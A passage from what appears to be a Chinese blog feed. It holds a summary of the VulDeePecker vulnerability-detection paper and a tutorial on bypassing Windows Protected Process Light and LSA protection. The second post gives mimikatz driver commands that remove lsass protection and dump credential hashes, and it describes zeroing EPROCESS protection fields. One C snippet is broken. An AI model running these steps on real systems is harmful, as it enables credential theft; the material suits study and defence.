id="2-1-code-gadget"><a href="#2-1-code-gadget" class="headerlink" title="2.1.code gadget"></a><strong>2.1.code gadget</strong></h2><p>为了生成code gadget，原文提出了关键点的启发式概念，可以将其视为一个“镜头”，通过它可以从某个角度表示程序。关键点的启发式概念在某种意义上可以看作是漏洞的“中心”或者暗示漏洞存在的代码段。</p><p>由于观察到许多漏洞与library&#x2F;API 函数调用有关，原文专注于使用library&#x2F;API 函数调用的特定关键点来证明其在基于深度学习的漏洞检测中的有用性，调查其他类型关键点的有用性留作未来研究。</p><p>对于library&#x2F;API函数调用使用不当导致的漏洞，重点在于library&#x2F;API函数调用；对于数组使用不当造成的漏洞，关键在数组。一类漏洞可能有多种关键点，例如缓冲区错误漏洞可能对应以下关键点：library&#x2F;API函数调用、数组和指针。同一种关键点可能存在于多种类型的漏洞中，例如缓冲区错误和资源管理错误漏洞都可能包含library&#x2F;API函数调用的关键点。</p><p>对应library&#x2F;API函数调用的关键点，可以通过程序的数据流或控制流分析的方式生成code gadgets，这方面有现成的算法和商业产品，如Checkmarx，Checkmarx 根据人类专家手动定义的一些规则来检测漏洞。原文不使用它的规则进行漏洞检测，但将比较 VulDeePecker 的有效性。</p><p>关于数据集具体怎样生成，读者认为单独拿出来不利于文章的结构表述，在VulDeePecker系统架构一节的learning phase中的第一步和第二步会详细介绍。</p><h1 id="3-Guiding-Principles"><a href="#3-Guiding-Principles" class="headerlink" title="3.Guiding Principles"></a><strong>3.Guiding Principles</strong></h1><p>为了更好的使用深度学习检测漏洞，提出了三个基本问题，在问题的基础上引出了三点guiding principles。</p><h2 id="3-1-哪种程序表示合适？"><a href="#3-1-哪种程序表示合适？" class="headerlink" title="3.1.哪种程序表示合适？"></a><strong>3.1.哪种程序表示合适？</strong></h2><p>因为向量需要保留程序的语义信息，所以不能随意将程序转换为向量。可以使用一些中间表示作为程序与其向量表示之间的“桥梁”，这是深度学习的输入。</p><p><strong>Guiding Principle 1</strong>：程序可以首先转换为一些中间表示，这些表示可以保留程序元素之间的语义关系（例如，数据依赖性和控制依赖性）。然后，可以将中间表示转换为向量表示，即神经网络的输入。</p><p>Guiding Principle 1 直接导致code gadget的中间表示出现，其灵感来自代码重用攻击上下文中的gadget，其是少量且不一定连续的代码行。</p><h2 id="3-2-哪种粒度合适？"><a href="#3-2-哪种粒度合适？" class="headerlink" title="3.2.哪种粒度合适？"></a><strong>3.2.哪种粒度合适？</strong></h2><p>由于不仅需要检测程序是否存在漏洞，而且还需要确定漏洞的位置，所以应该使用更细的粒度来进行基于深度学习的漏洞检测。也即漏洞检测不应该在程序或函数级别进行，其含有大量代码，过于粗粒度，并且确定漏洞的位置本身就是一项艰巨的任务。</p><p><strong>Guiding Principle 2</strong>:为了帮助确定漏洞的位置，程序应该以比将程序或函数作为一个单元处理时更细的粒度来表示。上述code gadget表示自然满足guiding principle 2。</p><h2 id="3-3-哪种神经网络合适？"><a href="#3-3-哪种神经网络合适？" class="headerlink" title="3.3.哪种神经网络合适？"></a><strong>3.3.哪种神经网络合适？</strong></h2><p>神经网络在图像处理、语音识别和自然语言处理等领域非常成功，但是这些领域不同于漏洞检测，即很多神经网络可能并不适合漏洞检测，需要一些guiding principle选择适合漏洞检测的神经网络。</p><p><strong>Guiding Principle 3</strong>:由于一行代码是否包含漏洞可能取决于上下文，因此能够应对上下文的神经网络可能适用于漏洞检测。</p><p>由于上下文在自然语言处理中也很重要，所以用于自然语言处理的神经网络可能适用于漏洞检测。由于程序函数调用的参数受早、中、后期操作的影响，故将上下文的概念引入本文。</p><p>有许多用于自然语言处理的神经网络，作者先从RNN开始讨论。RNN可以有效地处理顺序数据，且已用于程序分析（但不是用于漏洞检测目的），但是RNN 存在梯度消失 (VG) 问题，会导致模型训练无效。VG 问题由 RNN 的双向变体继承而来（inherited by the Bidirectional variant of RNNs），称BRNN。VG 问题可以通过将 RNN 引入记忆单元解决，有长短期记忆 (LSTM) 单元和门控循环单元 (GRU) 单元。GRU 在语言建模方面并不优于 LSTM ，故作者选择 LSTM 进行漏洞检测，但是将其与 GRU 的比较推迟到未来的工作中。 LSTM 也可能不足以进行漏洞检测，函数调用的参数可能会受到程序前面语句的影响，也可能会受到后面语句的影响，而LSTM是单向的。这表明单向 LSTM 可能不够用，所以作者使用双向 LSTM (BLSTM) 进行漏洞检测。下面是BLSTM的简单结构和解释。</p><p><img src="image-20240520151059800.png" alt="image-20240520151059800"></p><p>上图是 BLSTM 神经网络的结构，具有多个 BLSTM 层、一个密集层和一个 softmax 层。输入是向量； BLSTM 层有前向和后向两个方向。 BLSTM 层包含一些复杂的 LSTM 单元，作者将其视为黑盒；密集层减少来自 BLSTM 层向量的维数； softmax层将从密集层接收到的低维向量作为输入，负责表示和格式化分类结果，为学习阶段(VulDeePecker的其中一个阶段)的神经网络参数更新提供反馈。学习阶段的输出是模型参数微调的BLSTM神经网络，检测阶段的输出是分类结果。</p><h1 id="4-VulDeePecker系统架构"><a href="#4-VulDeePecker系统架构" class="headerlink" title="4.VulDeePecker系统架构"></a><strong>4.VulDeePecker系统架构</strong></h1><p>下面是整个系统架构，有两个阶段：学习阶段和检测阶段。学习阶段的输入是大量的训练程序，其中一些包含一个或多个已知漏洞的，另一些则不是。 学习阶段的输出是漏洞模式，被编码到 BLSTM 神经网络中。</p><p><img src="image-20240520151112611.png" alt="image-20240520151112611"></p><h2 id="4-1-learning-phase"><a href="#4-1-learning-phase" class="headerlink" title="4.1.learning phase"></a><strong>4.1.learning phase</strong></h2><p>学习阶段有 4 个步骤。</p><h3 id="4-1-1-步骤1：提取library-API-函数调用和相应的程序切片"><a href="#4-1-1-步骤1：提取library-API-函数调用和相应的程序切片" class="headerlink" title="4.1.1.步骤1：提取library&#x2F;API 函数调用和相应的程序切片"></a><strong>4.1.1.步骤1：提取library&#x2F;API 函数调用和相应的程序切片</strong></h3><p>有两个子步骤。</p><h4 id="1）步骤1-1：提取library-API函数调用"><a href="#1）步骤1-1：提取library-API函数调用" class="headerlink" title="1）步骤1.1：提取library&#x2F;API函数调用"></a><strong>1）步骤1.1：提取library&#x2F;API函数调用</strong></h4><p>原文将library&#x2F;API函数调用分为两类：前向library&#x2F;API函数调用和后向library&#x2F;API函数调用。前向library&#x2F;API 函数调用是直接从外部输入（例如命令行、程序、套接字或文件）接收一个或多个输入的函数调用，后向library&#x2F;API 函数调用是不直接从程序运行环境接收任何外部输入的函数调用。</p><p><img src="image-20240520151123173.png" alt="image-20240520151123173"></p><p>上图(原文中为图3，在下文中也称为图三)显示了后向library&#x2F;API 函数调用 strcpy（第 9 行）的示例，由于它不直接接收任何外部输入，所以是一个后向的library&#x2F;API 函数调用。</p><p>之所以强调前向和后向library&#x2F;API 函数调用之间的区别，是由于对于前向library&#x2F;API 函数调用，受输入参数影响的语句很关键，因为可能容易受到不正确参数值的影响；对于后向的library&#x2F;API 函数调用，影响参数值的语句很关键，可能使library&#x2F;API 函数调用受攻击。观察到的这种现象将被用来指导code gadget的向量表示的启发式填充。</p><h4 id="2）步骤1-2：提取程序切片"><a href="#2）步骤1-2：提取程序切片" class="headerlink" title="2）步骤1.2：提取程序切片"></a><strong>2）步骤1.2：提取程序切片</strong></h4><p>该步骤生成 从训练程序中提取的 library&#x2F;API 函数调用的参数 相对应的程序切片。定义了两种切片：前向切片和后向切片，其中前向切片对应于受相关参数影响的语句，后向切片对应于可以影响相关参数的语句。原文利用商业产品 Checkmarx 的数据依赖图，来提取这两种切片。基本思想如下：</p><p>a).对于前向library&#x2F;API 函数调用中的每个参数，生成一个或多个前向切片，后者对应于与参数相关的切片在library&#x2F;API 函数调用处或之后分支的情况。（For each argument in a forward library&#x2F;API function call, one or multiple forward slices are generated, with the latter corresponding to the case that the slice related to the argument is branched at, or after, the library&#x2F;API function call.）</p><p>b).对于后向library&#x2F;API 函数调用中的每个参数，都会生成一个或多个后向切片，后者对应于与参数相关的多个切片在library&#x2F;API 函数调用时或之前合并的情况。（For each argument in a backward library&#x2F;API function call, one or multiple backward slices are generated, with the latter corresponding to the case that multiple slices related to the argument are merged at, or prior to, the library&#x2F;API function call.）</p><p>切片可以超出所讨论的用户定义函数的边界，因为一个程序片由多个语句组成，这些语句可能属于多个用户定义的函数</p><p>图 3 显示了一个包含库函数调用 strcpy 的示例程序，有两个参数 buf 和 str。 strcpy 是一个后向函数调用，为每个参数生成一个反向切片。对于参数 buf ，切片由三个语句组成，即程序的第 4、5 和 9 行，属于用户自定义函数test()；对于参数 str，切片由 6 条语句组成，即程序的第 13、15、18、19、2 和 9 行，其中前 4 条属于用户自定义函数 main，后 2 条属于用户自定义函数定义的函数test()。这两个切片是链（即线性结构），因为 Checkmarx 使用链来表示切片，同时切片也可以用树来表示。由于线性结构只能表示一个单独的切片，所以一个library&#x2F;API函数调用往往对应多个切片。</p><h3 id="4-1-2-步骤2：生成训练程序的code-gadget及其基本事实标签。"><a href="#4-1-2-步骤2：生成训练程序的code-gadget及其基本事实标签。" class="headerlink" title="4.1.2.步骤2：生成训练程序的code gadget及其基本事实标签。"></a><strong>4.1.2.步骤2：生成训练程序的code gadget及其基本事实标签。</strong></h3><p>此步骤有两个子步骤。</p><h4 id="1）步骤2-1-：将程序切片组装成code-gadget"><a href="#1）步骤2-1-：将程序切片组装成code-gadget" class="headerlink" title="1）步骤2.1.：将程序切片组装成code gadget"></a><strong>1）步骤2.1.：将程序切片组装成code gadget</strong></h4><p>将上一步生成的程序切片组装成code gadget如下：</p><p>首先，给定一个library&#x2F;API 函数调用和相应的程序片段，将属于同一用户定义函数的语句（即代码片段）按照语句在用户定义的函数合并，如果有重复的，删除。在图 3 所示的示例中，属于用户自定义函数test的三个语句（第 4、5 和 9 行）是参数 buf 对应的程序切片，属于自定义函数test的2条语句（第 2 和 9 行）是参数str对应的程序切片的一段。根据这些语句在函数测试中出现的行号，可以得出2 → 4 → 5 → 9 → 9。由于第9行对应的语句重复，剔除重复得到一段汇编语句2 → 4 → 5 → 9，对应函数test。</p><p>其次，将属于不同的用户定义函数的语句组装到一个code gadget中。如果属于这些用户定义函数的两条语句之间已经存在顺序，则保留该顺序；否则，使用随机顺序。在图3所示的例子中，属于用户自定义函数main的语句（第13、15、18和19行）和属于用户自定义函数test的语句（第2、4、5、9行)，得到13 → 15 → 18 → 19 → 2 → 4 → 5 → 9，这是库函数调用strcpy对应的code gadget。此code gadget保留了与参数 str 对应的程序切片中包含的用户定义函数的顺序。</p><h4 id="2）步骤2-2：标记基本事实"><a href="#2）步骤2-2：标记基本事实" class="headerlink" title="2）步骤2.2：标记基本事实"></a><strong>2）步骤2.2：标记基本事实</strong></h4><p>每个code gadget都需要标记为“1”（易受攻击）和“0”（不易受攻击）。如果code gadget对应于训练数据集中已知的漏洞，则将其标记为“1”；否则，标记为“0”。</p><h3 id="4-1-3-步骤3：将code-gadget转换为矢量表示。"><a href="#4-1-3-步骤3：将code-gadget转换为矢量表示。" class="headerlink" title="4.1.3.步骤3：将code gadget转换为矢量表示。"></a><strong>4.1.3.步骤3：将code gadget转换为矢量表示。</strong></h3><p>此步骤有两个子步骤。</p><h4 id="1）步骤3-1：将code-gadget转换为其符号表示"><a href="#1）步骤3-1：将code-gadget转换为其符号表示" class="headerlink" title="1）步骤3.1：将code gadget转换为其符号表示"></a><strong>1）步骤3.1：将code gadget转换为其符号表示</strong></h4><p>此步骤旨在启发式地捕获程序中的一些语义信息以训练神经网络。首先，删除非 ASCII 字符和注释；其次，将用户定义的变量以一对一的方式映射到符号名称（例如，“VAR1”、“VAR2”）；最后，将用户定义的函数以一对一的方式映射到符号名称（例如，“FUN1”、“FUN2”）。注意当多个函数出现在不同的code gadget中时，可能会映射到相同的符号名称。如下图展示了此过程。</p><p><img src="image-20240520151132126.png" alt="image-20240520151132126"></p><h4 id="2）步骤3-2：将符号表示编码为向量"><a href="#2）步骤3-2：将符号表示编码为向量" class="headerlink" title="2）步骤3.2：将符号表示编码为向量"></a><strong>2）步骤3.2：将符号表示编码为向量</strong></h4><p>每个code gadget都需要通过其符号表示编码为向量。为此，通过词法分析将符号表示中的code gadget划分为一系列标记，包括标识符、关键字、运算符和符号。例如，符号表示中的code gadget，“strcpy(VAR5, VAR2); ” 由 7 个标记的序列表示：“strcpy”, “(”, “VAR5”, “,”, “VAR2”, “)”, “;”。</p><p>这会形成大量的令牌语料库。使用 word2vec 将标记转换为向量，由于code gadget可能具有不同数量的令牌，因此相应的向量可能具有不同的长度。由于 BLSTM 采用等长向量作为输入，因此需要进行调整。为此引入参数 τ 作为与code gadget对应的向量的固定长度。</p><p>当向量小于 τ 时，有两种情况：如果code gadget是从一个反向切片生成的，或者是通过组合多个反向切片生成的，在向量的开头填充零；否则，将零填充到向量的末尾。</p><p>当一个向量大于τ时，也有两种情况：如果code gadget是从一个反向切片生成的，或者是多个反向切片组合生成的，删除向量的开头部分；否则，删除向量的结尾部分。</p><p>每个code gadget都表示为一个 τ 位向量。向量的长度与 BLSTM 每一层隐藏节点的数量有关，这是一个可以调整的参数，以提高漏洞检测的准确性。</p><h3 id="步骤4：训练-BLSTM-神经网络"><a href="#步骤4：训练-BLSTM-神经网络" class="headerlink" title="步骤4：训练 BLSTM 神经网络"></a><strong>步骤4：训练 BLSTM 神经网络</strong></h3><p>将code gadget编码成向量并获得它们的真实标签后，训练 BLSTM 神经网络。</p><h2 id="4-2-detection-phase"><a href="#4-2-detection-phase" class="headerlink" title="4.2.detection phase"></a><strong>4.2.detection phase</strong></h2><p>上述BLSTM网络输出哪些向量易受攻击（“1”）或不易受攻击（“0”）。如果code gadget易受攻击，它会确定目标程序中漏洞的位置。如图 2(b) 中突出显示的那样，此阶段有两个步骤。</p><h3 id="4-2-1-步骤5：将目标程序转化为code-gadget和向量"><a href="#4-2-1-步骤5：将目标程序转化为code-gadget和向量" class="headerlink" title="4.2.1.步骤5：将目标程序转化为code gadget和向量"></a><strong>4.2.1.步骤5：将目标程序转化为code gadget和向量</strong></h3><p>五个子步骤。</p><p>• 步骤1：从目标程序中提取library&#x2F;API 函数调用（类似于步骤 1.1）。</p><p>• 步骤2：根据library&#x2F;API 函数调用的参数提取程序切片（类似于步骤1.2）。</p><p>• 步骤3：将程序片段组装成code gadget（类似于步骤2.1）。</p><p>• 步骤4：将code gadget转换为符号表示（类似于步骤3.1）。</p><p>• 步骤5：将code gadget的符号表示编码为向量（类似于步骤3.2）。</p><h3 id="4-2-2-步骤6：检测"><a href="#4-2-2-步骤6：检测" class="headerlink" title="4.2.2.步骤6：检测"></a><strong>4.2.2.步骤6：检测</strong></h3><p>此步骤使用学习过的的 BLSTM 神经网络对与从目标程序中提取的code gadget相对应的向量进行分类。当一个向量被归类为“1”（即易受攻击）时，这意味着相应的code gadget是易受攻击的，并且漏洞的位置被确定了。否则，相应的code gadget被归类为“0”（即不易受攻击）。</p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PPL绕过</title>
      <link href="/2023/02/05/PPL%E7%BB%95%E8%BF%87/"/>
      <url>/2023/02/05/PPL%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<hr><p>来源：<a href="https://www.freebuf.com/articles/system/332506.html%E5%92%8C%E7%BA%A2%E9%98%9F%E8%93%9D%E5%86%9B%E7%9A%84%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0">https://www.freebuf.com/articles/system/332506.html和红队蓝军的一篇文章</a></p><p>od分析过程似懂非懂，留着以后补坑</p><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>PPL，Protected Process Light ，但在此之前，只有Protected Process。Windows Vista &#x2F; Server 2008引入了受保护进程的概念，其目的不是保护您的数据或凭据。其最初目标是保护媒体内容并符合DRM（数字版权管理）要求。Microsoft开发了此机制，以便您的媒体播放器可以读取例如蓝光，同时防止您复制其内容。当时的要求是映像文件（即可执行文件）必须使用特殊的Windows Media证书进行数字签名（如Windows Internals的“受保护的过程”部分所述）。</p><p>在实践中，一个受保护的过程可通过未保护的过程仅具有非常有限的权限访问： PROCESS_QUERY_LIMITED_INFORMATION ， PROCESS_SET_LIMITED_INFORMATION ， PROCESS_TERMINATE 和 PROCESS_SUSPEND_RESUME 。对于某些高度敏感的过程，甚至可以减少此设置。</p><p>几年后，从Windows 8.1 &#x2F; Server 2012 R2开始，Microsoft引入了Protected Process Light的概念。PPL实际上是对先前“受保护过程”模型的扩展，并添加了“保护级别”的概念，这基本上意味着某些PP（L）进程可以比其他进程受到更多保护。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="定义保护级别"><a href="#定义保护级别" class="headerlink" title="定义保护级别"></a>定义保护级别</h3><p>Protected Process Light的内部结构</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess">https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess</a></p><p>在windows中，EPROCESS结构现在具有以下类型的”保护”字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PS_PROTECTION &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        UCHAR Level;</span><br><span class="line">        struct &#123;</span><br><span class="line">            UCHAR Type   : 3;</span><br><span class="line">            UCHAR Audit  : 1;                  // Reserved</span><br><span class="line">            UCHAR Signer : 4;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; PS_PROTECTION, *PPS_PROTECTION;</span><br></pre></td></tr></table></figure><p>其中Type定义进程是 PP 还是 PPL，Type的值可以是以下之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_PS_PROTECTED_TYPE</span><br><span class="line">PsProtectedTypeNone = 0n0</span><br><span class="line">PsProtectedTypeProtectedLight = 0n1</span><br><span class="line">PsProtectedTypeProtected = 0n2</span><br><span class="line">PsProtectedTypeMax = 0n3</span><br></pre></td></tr></table></figure><p>Signer即实际保护级别,Signer的值可以是以下之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_PS_PROTECTED_SIGNER</span><br><span class="line">PsProtectedSignerNone = 0n0</span><br><span class="line">PsProtectedSignerAuthenticode = 0n1</span><br><span class="line">PsProtectedSignerCodeGen = 0n2</span><br><span class="line">PsProtectedSignerAntimalware = 0n3</span><br><span class="line">PsProtectedSignerLsa = 0n4</span><br><span class="line">PsProtectedSignerWindows = 0n5</span><br><span class="line">PsProtectedSignerWinTcb = 0n6</span><br><span class="line">PsProtectedSignerMax = 0n7</span><br></pre></td></tr></table></figure><p>_PS_PROTECTED_TYPE和_PS_PROTECTED_SIGNER结构的定义如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">typedef enum _PS_PROTECTED_TYPE &#123;</span><br><span class="line">    PsProtectedTypeNone = 0,</span><br><span class="line">    PsProtectedTypeProtectedLight = 1,</span><br><span class="line">    PsProtectedTypeProtected = 2</span><br><span class="line">&#125; PS_PROTECTED_TYPE, *PPS_PROTECTED_TYPE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef enum _PS_PROTECTED_SIGNER &#123;</span><br><span class="line">    PsProtectedSignerNone = 0,      // 0</span><br><span class="line">    PsProtectedSignerAuthenticode,  // 1</span><br><span class="line">    PsProtectedSignerCodeGen,       // 2</span><br><span class="line">    PsProtectedSignerAntimalware,   // 3</span><br><span class="line">    PsProtectedSignerLsa,           // 4</span><br><span class="line">    PsProtectedSignerWindows,       // 5</span><br><span class="line">    PsProtectedSignerWinTcb,        // 6</span><br><span class="line">    PsProtectedSignerWinSystem,     // 7</span><br><span class="line">    PsProtectedSignerApp,           // 8</span><br><span class="line">    PsProtectedSignerMax            // 9</span><br><span class="line">&#125; PS_PROTECTED_SIGNER, *PPS_PROTECTED_SIGNER;</span><br></pre></td></tr></table></figure><p>进程的保护级别就通过这两个值组合定义，有几种常见的组合，比如这里将_PS_PROTECTION的值修改为0x72就能够将一个普通的进程变为受保护状态</p><p><img src="1675574628918-ccd96860-e041-4f92-9a47-0bfb3cd5e4fc.png" alt="img"></p><p>可以编写函数判断进程的保护级别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bool FindProcessProtect() </span><br><span class="line">&#123;</span><br><span class="line">    PS_PROTECTION ProtectInfo = &#123; 0 &#125;;</span><br><span class="line">    NTSTATUS ntStatus = ZwQueryInformationProcess(NtCurrentProcess(), ProcessProtectionInformation, &amp;ProtectInfo, sizeof(ProtectInfo), NULL);</span><br><span class="line">    bool  = false;</span><br><span class="line">    bool Result2 = false;</span><br><span class="line"></span><br><span class="line">    if (NT_SUCCESS(ntStatus)) </span><br><span class="line">    &#123;</span><br><span class="line">        Result1 = ProtectInfo.Type == PsProtectedTypeNone &amp;&amp; ProtectInfo.Signer == PsProtectedSignerNone;</span><br><span class="line">        PROCESS_EXTENDED_BASIC_INFORMATION ProcessExtenedInfo = &#123; 0 &#125;;</span><br><span class="line">        ntStatus = ZwQueryInformationProcess(NtCurrentProcess(), ProcessBasicInformation, &amp;ProcessExtenedInfo, sizeof(ProcessExtenedInfo), NULL);</span><br><span class="line"></span><br><span class="line">        if (NT_SUCCESS(ntStatus)) </span><br><span class="line">        &#123;</span><br><span class="line">            Result2 = ProcessExtenedInfo.IsProtectedProcess == false &amp;&amp; ProcessExtenedInfo.IsSecureProcess == false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return Result2 &amp;&amp; Result1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-LSA"><a href="#2-LSA" class="headerlink" title="2.LSA"></a>2.LSA</h1><p>LSA即RunAsPPL，虽然lsass进程有PPL，微软为了防止非管理非 PPL 进程通过开放访问或篡改 PPL 进程中的代码和数据推出了LSA，但是在一般情况下是并没有启用的</p><p>没有启用LSA的时候能够使用mimikatz正常抓取密码</p><p><img src="1675574869775-0b5a2cd5-2abf-4932-a7d2-fdf663777e13.png" alt="img"></p><p><strong>开启<strong><strong>LSA就不能使用mimikatz正常抓密码了</strong></strong>，</strong></p><p><strong>开启lsa过程</strong></p><p>找到HKLM\SYSTEM\CurrentControlSet\Control\Lsa然后添加一个DWORD值RunAsPPL，并把值从0改为1即可开启LSA<br> <img src="1675574916133-be56346c-3d1a-4940-bc27-def487064720.png" alt="img"></p><p>启用lsa之后的lsass</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22207390/1675574779884-2d53630a-f664-4bc2-8c6a-811afec99b93.png" alt="img"></p><p>重启之后我们再尝试提权之后抓取密码，已经看到这里报错0xc0000005，这里异常出在kuhl_m_sekur1sa_acquireLSA模块</p><p><img src="1675574963282-fc5955ff-abf1-4036-977c-d78a0a20ee19.png" alt="img"></p><p><a href="https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c">kuhl_m_sekurlsa.c</a></p><p><img src="1675575098575-834d26a2-abba-4160-a3a2-603ffb8cea24.png" alt="img"></p><p>去到kuhl_m_sekurlsa_acquireLSA函数，我们看一下核心的代码，首先找到通过进程名获取PID，然后通过OpenProcess获得句柄</p><p><img src="1675575181467-a7fb0579-4cd1-4f28-aefc-c5859f221225.png" alt="img"></p><p>判断句柄是否为INVALID_HANDLE_VALUE即无效句柄，如果为无效句柄直接调用PRINT_ERROR</p><p><img src="1675575201665-91680d6b-5207-4afb-883b-b2889e3d8d1c.png" alt="img"></p><p><img src="1675575216042-24fcb9b9-ca51-4549-bebc-895fbad2e097.png" alt="img"></p><p>PRINT_ERROR_AUTO是一个宏，其作用是打印出失败函数的名称和错误代码，底层调用GetLastError来打印出错误信息，这里也就是说</p><p><img src="1675575268105-6c40db86-4393-42e6-a094-a5836444fbf6.png" alt="img"></p><h2 id="mimidrv-sys绕过LSA"><a href="#mimidrv-sys绕过LSA" class="headerlink" title="mimidrv.sys绕过LSA"></a>mimidrv.sys绕过LSA</h2><p>加载之后即可关闭LSA保护，正常<strong>dump hash</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">#该命令会从用户模式启动驱动程序，并请求为当前令牌分配`SeLoadDriverPrivilege</span><br><span class="line">!procoessprotect /process:lsass.exe /remove</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="1675575436636-3b0c8fcb-62ec-4a6c-8acb-a3b48ca56f41.png" alt="img"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>mimikatz首先检查驱动程序在当前工作目录中是否存在，如果找到磁盘上的驱动程序，则开始创建服务。服务的创建是通过服务控制管理器（SCM）API函数来完成的。具体而言，advapi32!ServiceCreate将用于注册具有以下属性的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CreateService(</span><br><span class="line"></span><br><span class="line">hSC, //Handle to the SCM database provided by OpenSCManager</span><br><span class="line">&#x27;mimidrv&#x27;, //Service name</span><br><span class="line">&#x27;mimikatz driver (mimidrv)&#x27;, //Service display name</span><br><span class="line">READ_CONTROL | WRITE_DAC | SERVICE_START, //Desired access</span><br><span class="line">SERVICE_KERNEL_DRIVER, //Kernel driver service type</span><br><span class="line">SERVICE_AUTO_START, //Start the service automatically on boot</span><br><span class="line">SERVICE_ERROR_NORMAL, //Log driver errors that occur during startup to the event log</span><br><span class="line">&#x27;C:\\path\\to\\mimidrv.sys&#x27;, //Absolute path of the driver on disk</span><br><span class="line">NULL, //Load order group (unused)</span><br><span class="line">NULL, //Not used because the previous argument is NULL</span><br><span class="line">NULL, //No dependencies for the drive</span><br><span class="line">NULL, //Use NT AUTHORITY\SYSTEM to start the service</span><br><span class="line">NULL //Unused because we are using the SYSTEM account</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>如果成功创建了服务，则Evervone组将被授予对该服务的访问权限，从而允许系统上的任何用户与该服务进行交互。例如，低特权的用户可以停止该服务</p><p><img src="1675575642327-ce196631-a64c-413d-b785-40bd9865217c.png" alt="img"></p><p>然后通过StartService来启动服务</p><p><img src="1675575685821-98e35a94-2573-4d25-8be0-e564cfca6a34.png" alt="img"><br> 如果这里卸载驱动则OpenService失败</p><p><img src="1675575707356-a301f3f3-f05d-4c2e-9704-eb7808a6831b.png" alt="img"></p><h2 id="EPROCESS禁用LSA"><a href="#EPROCESS禁用LSA" class="headerlink" title="EPROCESS禁用LSA"></a>EPROCESS禁用LSA</h2><p>修改EPROCESS结构体的值来绕过LSA，在2004版本的0x878偏移存放着SignatureLevel，我们需要将着连续的几个字节修改为0，分别是SignatureLevel、SectionSignatureLevel、Level、Type、Audit和Signer</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22207390/1675575832214-a858c701-45de-4953-aa22-734e55f21b3e.png" alt="img"><img src="1675575841598-dda05c08-07ea-424e-92d6-5410a7bdc5a2.png" alt="img"></p><p><strong>如何定位到<strong><strong>lsass</strong></strong>进程呢</strong>？这里就需要找到内核机制，通过遍历PEB结构里的ActiveProcessLinks这个双向链表来找到</p><p>在win10 1607版本以后，微软更改了策略，将页目录基址更改为了随机地址，那么我们之前在win7里面直接定位PTE_Base的方法就不可用，那么我们就可以使用提取特征码的方式去定位内核模块的地址</p><p>首先在WinDbg中定位内核模块的地址</p><p><img src="1675575906083-8b3ada50-6c9d-40ed-add2-1e0bdfe20266.png" alt="img"></p><p>然后在内核模块中搜索与当前页表基址相同的值出现的位置，当前页表基址为0xFFFF800000000000</p><p><img src="1675575943856-b7d4a788-3e84-4bb0-b616-0bd528a3c678.png" 